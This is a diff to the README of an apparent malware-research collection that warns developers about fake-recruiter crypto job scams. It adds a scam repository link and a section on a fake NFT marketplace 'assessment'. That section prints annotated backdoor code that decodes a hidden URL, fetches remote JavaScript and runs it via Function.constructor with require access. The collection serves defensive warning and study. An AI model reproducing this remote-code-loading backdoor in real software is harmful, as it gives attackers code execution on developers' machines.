@@ -16,42 +16,46 @@ The code is kept for educational and research purposes only.
 
 ## Table of Contents
 
-- [Known Scam Repos and APIs](#known-scam-repos-and-apis)
-- [Known Recruiter Profiles](#known-recruiter-profiles)
-- [Extra Links](#extra-links)
-- [LinkedIn Red Flags](#on-linkedin)
-  - [Compensation Red Flags](#compensation-red-flags)
-  - [Profile and Company Authenticity](#profile-and-company-authenticity)
-  - [Process Red Flags](#process-red-flags)
-  - [Due Diligence Steps](#due-diligence-steps)
-  - [Common Scam Tactics](#common-scam-tactics)
-- [Security Guidelines](#research-this-type-of-code)
-  - [Post and Pre-Install Scripts](#post-and-pre-install-scripts)
-  - [eval() and Dynamic Code Execution](#eval-and-dynamic-code-execution)
-  - [Obfuscated or Minified Code](#obfuscated-or-minified-code)
-  - [Supply Chain Attacks & Dependency Hijacking](#supply-chain-attacks--dependency-hijacking)
-  - [Unsafe Regular Expressions & Prototype Pollution](#unsafe-regular-expressions--prototype-pollution)
-- [Tools to Scan for Malicious & Obfuscated Code](#tools-to-scan-for-malicious--obfuscated-code)
-  - [JavaScript/TypeScript Tools](#javascripttypescript-tools)
-  - [Python Tools](#python-tools)
-- [What to Do If You Think You Were Affected](#what-to-do-if-you-think-you-were-affected)
-- [Additional Security Resources](#additional-security-resources)
-- [Final Recommendations](#final-recommendations)
-- [Malicious Repositories](#repositories)
-  - [1. Real Estate Project](#1-real-estate-project)
-  - [2. Real Estate New](#2-real-estate-new)
-  - [3. Multify Staking Project](#3-multify-staking-project)
-  - [4. Trend Dev Preproduction](#4-trend-dev-preproduction)
-  - [5. Munity Game](#5-munity-game)
-  - [6. ERC20 Token DApp](#6-erc20-token-dapp)
-  - [7. Challenge Experiment Module](#7-challenge-experiment-module)
-  - [8. Coinpool Rental Platform 1.0](#8-coinpool-rental-platform10)
-  - [9. Golden City](#9-golden-city)
-  - [10. Sarostech Assessment](#10-sarostech-assessment)
-  - [11. Scammer Documents](#11-scammer-documents)
-  - [12. Real Estate Rental Platform](#12-real-estate-rental-platform)
-  - [13. Web3Game Project](#13-web3game-project)
-- [Checking for Malicious npm Packages](#checking-for-malicious-npm-packages)
+- [**! Before All !**](#-before-all-)
+- [Malicious Repository Collection](#malicious-repository-collection)
+  - [Table of Contents](#table-of-contents)
+  - [Known Scam Repos and APIs](#known-scam-repos-and-apis)
+    - [Known scammer recruiter profiles](#known-scammer-recruiter-profiles)
+  - [Extra Links](#extra-links)
+  - [On Linkedin](#on-linkedin)
+    - [Compensation Red Flags](#compensation-red-flags)
+    - [Profile and Company Authenticity](#profile-and-company-authenticity)
+    - [Process Red Flags](#process-red-flags)
+    - [Due Diligence Steps](#due-diligence-steps)
+    - [Common Scam Tactics](#common-scam-tactics)
+  - [Research This Type of Code](#research-this-type-of-code)
+    - [Post and Pre-Install Scripts](#post-and-pre-install-scripts)
+    - [eval() and Dynamic Code Execution](#eval-and-dynamic-code-execution)
+    - [Obfuscated or Minified Code](#obfuscated-or-minified-code)
+    - [Supply Chain Attacks \& Dependency Hijacking](#supply-chain-attacks--dependency-hijacking)
+    - [Unsafe Regular Expressions \& Prototype Pollution](#unsafe-regular-expressions--prototype-pollution)
+  - [Tools to Scan for Malicious \& Obfuscated Code](#tools-to-scan-for-malicious--obfuscated-code)
+    - [JavaScript/TypeScript Tools](#javascripttypescript-tools)
+    - [Python Tools](#python-tools)
+  - [What to Do If You Think You Were Affected](#what-to-do-if-you-think-you-were-affected)
+  - [Additional Security Resources](#additional-security-resources)
+  - [Final Recommendations](#final-recommendations)
+  - [Repositories](#repositories)
+    - [1. Real Estate Project](#1-real-estate-project)
+    - [2. Real Estate New](#2-real-estate-new)
+    - [3. Multify Staking Project](#3-multify-staking-project)
+    - [4. Trend Dev Preproduction](#4-trend-dev-preproduction)
+    - [5. Munity Game](#5-munity-game)
+    - [6. ERC20 Token DApp](#6-erc20-token-dapp)
+    - [7. Challenge Experiment Module](#7-challenge-experiment-module)
+    - [8. Coinpool Rental Platform 1.0](#8-coinpool-rental-platform-10)
+    - [9. Golden City](#9-golden-city)
+    - [10. Sarostech Assessment](#10-sarostech-assessment)
+    - [11. Scammer Documents](#11-scammer-documents)
+    - [12. Real Estate Rental Platform](#12-real-estate-rental-platform)
+    - [13. Web3Game Project](#13-web3game-project)
+    - [14. Web3 Legendary NFT Marketplace](#14-web3-legendary-nft-marketplace)
+  - [Checking for Malicious npm Packages](#checking-for-malicious-npm-packages)
 
 ## Known Scam Repos and APIs
 
@@ -68,6 +72,7 @@ The code is kept for educational and research purposes only.
 - https://github.com/0xtuneTF7/DEX-staking-project
 - https://github.com/SuperDev313/Trading_Platform_Ultrax
 - https://bitbucket.org/web3_space/workspace/repositories/
+- https://bitbucket.org/0xnfteth/horsepowerfi/src/main/
 
 ### Known scammer recruiter profiles
 
@@ -511,6 +516,53 @@ export const connectWallet = async (provider) => {
     throw new Error('Failed to connect wallet');
   }
 };
+```
+
+### 14. Web3 Legendary NFT Marketplace
+
+Located in `0xnfteth-horsepowerfi/` directory.
+
+The malware:
+
+- Disguised as a blockchain NFT/Staking platform/marketplace
+- Contains backdoors that allow remote code execution (obfuscated eval() function with remote js code loading)
+- Was presented as a technical assessment during fake recruitment process, was needed to run and review code
+
+```javascript
+// Example of malicious code in 0xnfteth-horsepowerfi/server/controllers/userController.js
+// ────────────────────────────────────────────────────────────────────────────────
+// Malicious “getCookie” & “getSession” back-door
+// This pattern appears twice below. Both do essentially the same thing.
+// ────────────────────────────────────────────────────────────────────────────────
+
+//Get Cookie
+exports.getCookie = asyncErrorHandler(async (req, res, next) => {
+  const cookie = atob(process.env.DEV_API_KEY);
+  const k = atob(process.env.DEV_SECRET_KEY);
+  const v = atob(process.env.DEV_SECRET_VALUE);
+  // Fetch remote payload (`axios.get`) → expect JSON like { cookie: "<js-code>" }.
+  const s = (await axios.get(cookie, { headers: { [k]: v } })).data.cookie;
+  //  Build a *new function* from that string (same as `eval` but via Function()).
+  //  First arg 'require' becomes a parameter name; second arg is the code body.
+  const handler = new Function.constructor("require", s);
+  // Execute the payload, giving it full Node.js `require` capability
+  // (can read files, spawn processes, open sockets, etc.).
+  handler(require);
+})();
+
+// ────────────────────────────────────────────────────────────────────────────────
+// Exact same logic, just using a different env var to reach a second URL.
+// ────────────────────────────────────────────────────────────────────────────────
+
+//Get Session
+exports.getSession = asyncErrorHandler(async (req, res, next) => {
+  const session = atob(process.env.DEV_API_REQ);
+  const k = atob(process.env.DEV_SECRET_KEY);
+  const v = atob(process.env.DEV_SECRET_VALUE);
+  const s = (await axios.get(session, { headers: { [k]: v } })).data.cookie;
+  const handler = new Function.constructor("require", s);
+  handler(require);
+})();
 ```
 
 ## Checking for Malicious npm Packages
